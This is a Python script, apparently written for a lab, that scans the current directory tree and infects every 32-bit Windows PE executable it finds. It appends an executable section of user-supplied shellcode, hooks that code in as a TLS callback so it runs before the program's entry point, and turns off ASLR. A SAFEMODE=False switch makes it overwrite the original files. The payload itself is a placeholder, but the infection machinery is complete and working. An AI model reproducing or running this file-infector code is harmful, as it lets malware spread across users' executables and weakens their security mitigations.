import pefile 
import struct 
import os 


def u32(ok):
    return struct.unpack("<I", ok)[0]

def p32(num):
    return struct.pack("<I", num)


def check_fixed_address(peobj):
    pe = peobj
    image_base = pe.OPTIONAL_HEADER.ImageBase
    print(f"Image Base: {hex(image_base)}")
    
    # Check if the image can be relocated
    if pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040:
        print("The PE file is not fixed; it supports ASLR (Address Space Layout Randomization).")
        return False
    else:
        print("The PE file is likely fixed at address:", hex(image_base))
        return True

def ADD_NEW_SECTION_ENTRY(peobj : pefile.PE , sectioname : str, perm, injectdata : bytes, paddingbyte = b"\x90" ):
    '''
    Add new section by adjust section headers with new section
    Adding new section to the end of file
    Return: new section header object
    '''

    FileAlign = peobj.OPTIONAL_HEADER.FileAlignment
    SectionAlign = peobj.OPTIONAL_HEADER.SectionAlignment

    newsection = pefile.SectionStructure(peobj.__IMAGE_SECTION_HEADER_format__)
    newsection.Name = sectioname.encode()+ b"\x00" * (8 - len(sectioname))
    newsection.Misc_VirtualSize =  len(injectdata)
    newsection.Characteristics = perm 
    tmp = ((peobj.sections[-1].Misc_VirtualSize + SectionAlign - 1) // SectionAlign) * SectionAlign
    newsection.VirtualAddress = peobj.sections[-1].VirtualAddress + tmp # The Virtual Address should be align with SectionAlign
    newsection.SizeOfRawData =  (len(injectdata) + FileAlign  - 1) // FileAlign * FileAlign # align with FIleAlign 
    newsection.PointerToRawData = peobj.sections[-1].PointerToRawData + peobj.sections[-1].SizeOfRawData 
    newsection.PointerToLinenumbers = 0
    newsection.PointerToRelocations = 0
    newsection.NumberOfRelocations = 0 
    newsection.NumberOfLinenumbers = 0
    newsection.Misc = newsection.Misc_VirtualSize
    newsection.Misc_PhysicalAddress = newsection.Misc
    newsection.set_file_offset(peobj.sections[-1].get_file_offset() + 40)
    # print(newsection)

    print(f"{sectioname} Virtual Address: {hex(newsection.VirtualAddress)}")
    print(f"{sectioname} Virtual Size: {hex(newsection.Misc_VirtualSize)}")
    print(f"{sectioname} Pointer to Raw Data: {hex(newsection.PointerToRawData)}")
    print(f"{sectioname} Size of Raw Data: {hex(newsection.SizeOfRawData)}")


    peobj.sections.append(newsection)
    peobj.__structures__.append(newsection) ### IMPORTANT, Missing this will lead to wrong section

    peobj.FILE_HEADER.NumberOfSections += 1
    peobj.OPTIONAL_HEADER.SizeOfImage += ((len(injectdata) + 0xfff) // 0x1000) * 0x1000
    peobj.__data__ = peobj.__data__[:newsection.PointerToRawData ] + injectdata + (newsection.SizeOfRawData - len(injectdata)) * paddingbyte 
    peobj.OPTIONAL_HEADER.CheckSum = peobj.generate_checksum()

    return newsection

def ADD_TLS_CALLBACK(peobj : pefile.PE, callback_rva):
    '''
    Add TLS callback to PE object
    The callback RVA should be already in 1 of sections of PE object
    '''
    imagebase = peobj.OPTIONAL_HEADER.ImageBase
    if hasattr(peobj, "DIRECTORY_ENTRY_TLS"):
        #NOTE: In the case file already have TLS Directory, I will try to find the callback0 holder, replace with callback_rva
        # which, the shellcode must do return to callback0
        tls_directory = peobj.DIRECTORY_ENTRY_TLS.struct
        VA_shellcode = imagebase + callback_rva
        callback_list_RVA = tls_directory.AddressOfCallBacks - imagebase
        callback_list_offset = peobj.get_offset_from_rva(callback_list_RVA)
        callback0 = u32(peobj.__data__[callback_list_offset : callback_list_offset + 4])
        print(f"Callback list RVA addr: {hex(callback_list_RVA)}")

        peobj.__data__ = peobj.__data__[:callback_list_offset] + p32(VA_shellcode) + peobj.__data__[callback_list_offset + 4 : ]

        # print("Object already has TLS entry !")
    else:
        

        # Create new empty section for TLS, this will also be used for storing callback lists 
        tls_section = ADD_NEW_SECTION_ENTRY(peobj, ".wtf", 0xC0000040 , b"\x00" * 0x200, b"\x00")

        # Update TLS Directory entry in Data directory 
        peobj.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']].VirtualAddress = tls_section.VirtualAddress
        peobj.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']].Size = 0x18 # Size of the TLS Directory

        #NOTE: it seem that the AddressOfIndex should be a valid pointer, about why I choose SizeOfZerofill to point to
        # you should visit this site: https://www.shelliscoming.com/2015/06/tls-injector-running-shellcodes-through.html

        tls_directory = p32(0) + p32(0) + p32(imagebase + tls_section.VirtualAddress + 16) + p32(imagebase + tls_section.VirtualAddress + 0x100) + p32(0) + p32(0x40000040)
        # Modify .tls section, so it contain pointer to callback_rva
        idx = tls_section.PointerToRawData
        peobj.__data__ = peobj.__data__[:idx] + tls_directory + peobj.__data__[idx + 0x18 :idx + 0x100] + p32(callback_rva + imagebase) + peobj.__data__[idx + 0x100 + 4 : ]


def TLS_CALLBACK_INJECTION(peobj):
    imagebase = peobj.OPTIONAL_HEADER.ImageBase
    ############################# SHELLCODE INJECT #####################################
    oep = imagebase + peobj.OPTIONAL_HEADER.AddressOfEntryPoint
    import keystone as kstone
    ks = kstone.Ks(kstone.KS_ARCH_X86, kstone.KS_MODE_32)
    ### ADDITIONAL STEP, in case of TLS present, if callback0 is not null, replace oep with callback0
    if hasattr(peobj, "DIRECTORY_ENTRY_TLS"):
        tls_directory = peobj.DIRECTORY_ENTRY_TLS.struct
        callback_list_RVA = tls_directory.AddressOfCallBacks - imagebase
        callback_list_offset = peobj.get_offset_from_rva(callback_list_RVA)
        callback0 = u32(peobj.__data__[callback_list_offset : callback_list_offset + 4])
        if callback0 != 0:
            oep = callback0
    '''
    MY SHELLCODE FOR LAB, you can replace asm with your shellcode, remember to add  ``push {oep}; ret`` to the end of your shellcode
    So it will go back to orignal entry point
    '''
    
    asm = f'''
    replace your assembly here
    '''
    perm = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE'] | \
                  pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] | \
                  pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ']
    okcode, count = ks.asm(asm)
    shellcode = bytes(okcode)
    '''
    OR you can replace your shellcode in ``shellcode``
    '''
    inject_section = ADD_NEW_SECTION_ENTRY(peobj, ".lmao", perm, shellcode)
    ###############################################################################################

    print(f"Code VA: {hex(inject_section.VirtualAddress + imagebase)}")

    ################ ADD TLS CALLBACK ########################
    ADD_TLS_CALLBACK(peobj, inject_section.VirtualAddress)
    ##########################################################

def list_all_files(cwd):
    '''
    This func will list all files in pwd directory (included sub-directories)
    '''
    
    filels = []
    for i in os.listdir(cwd):
        filepath = os.path.join(cwd, i)
        if os.path.isdir(filepath):
            filels.extend(list_all_files(filepath)) 
        else:
            filels.append(filepath)
    return filels


###############################################################################################
#                                         MAIN FLOW                                           #
###############################################################################################

'''
INJECT TIME, enumerate through all files in current folder and subfolders (just current, I dont want to infect all :)) )
'''
    
SAFEMODE = True # If safemode = false, the original file will be overwriten

file_list = list_all_files(os.getcwd())


for currentfile in file_list:
    print(f"[+] {currentfile}")
    try:
        PEobj = pefile.PE(currentfile)
    except:
        print(f"Current file is not PE file. PASSING ~~~")
        continue

    if PEobj.OPTIONAL_HEADER.Magic != 0x10b:
        print(f"Current file is not PE32 file. PASSING ~~~")
        continue
    print("Working...")
    if SAFEMODE:
        TARGETFILEPATH = currentfile[:-4] + "_injected.exe"
    else:
        TARGETFILEPATH = currentfile
        
    ### CHECKING SECURITY MITIGATION
    if not check_fixed_address(PEobj):
        print("Turning off Dllcanmove")
        PEobj.OPTIONAL_HEADER.DllCharacteristics ^= 0x0040
    TLS_CALLBACK_INJECTION(PEobj)
    PEobj.OPTIONAL_HEADER.CheckSum = PEobj.generate_checksum()
    PEobj.write(TARGETFILEPATH)

        
        